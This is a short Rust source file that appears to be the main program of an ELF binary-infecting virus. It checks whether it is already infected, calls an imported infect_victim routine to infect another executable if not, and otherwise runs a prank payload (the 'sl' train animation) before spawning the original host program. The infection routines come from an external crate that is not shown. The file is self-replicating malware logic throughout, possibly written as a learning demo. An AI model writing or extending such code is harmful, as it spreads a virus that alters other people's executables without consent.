use sl::sl;
use elf_infection::infect::{
    infect_victim,
    is_already_infected,
    spawn_infected_program,
};

fn main() {
    match is_already_infected() {
        false => infect_victim(),
        true => payload(),
    }
}

fn fun_stuff() {
    let sl_args : Vec<String> = vec![String::new();1];
    sl(&sl_args);
}

fn payload() {
    fun_stuff();
    let _ = spawn_infected_program();
}



